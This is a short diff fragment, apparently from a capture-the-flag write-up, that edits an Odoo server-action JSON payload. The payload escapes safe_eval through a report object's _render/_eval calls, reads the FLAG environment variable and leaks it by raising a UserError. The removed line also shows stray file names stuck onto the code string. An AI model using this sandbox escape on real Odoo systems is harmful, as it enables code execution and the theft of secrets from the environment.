@@ -155,7 +155,7 @@ so here's the thing: `safe_eval` prevents you from calling `__import__` or acces
       "name": "x",
       "model_id": 86,
       "state": "code",
-      "code": "r=env['report.report_xlsx_helper.test_partner_xlsx']\ncode=r._render(\"__import__('os').environ.get('FLAG', 'x')\")\nresult=r._eval(code,{})\nraise UserError(str(result))all_challenges.jsonl CRYPTO_CHALLENGES_SUMMARY.md QUICK_REFERENCE.md puzzle_challenge_summary.md CTF_CHALLENGE_ANALYSIS.md kuriboh_ctf_analysis.md"
+      "code": "r=env['report.report_xlsx_helper.test_partner_xlsx']\ncode=r._render(\"__import__('os').environ.get('FLAG', 'x')\")\nresult=r._eval(code,{})\nraise UserError(str(result))"
     }],
     "kwargs": {}
   }
